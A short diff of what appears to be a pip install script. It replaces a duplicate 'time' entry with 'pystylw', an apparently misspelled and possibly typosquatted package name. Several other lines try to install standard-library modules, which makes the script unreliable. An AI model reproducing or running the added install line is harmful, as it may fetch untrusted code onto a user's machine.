@@ -6,6 +6,6 @@ python -m pip install json
 python -m pip install ctypes
 python -m pip install time
 python -m pip install watchdog
-python -m pip install time
+python -m pip install pystylw
 python -m pip install discord_webhook
 python -m pip install shutil
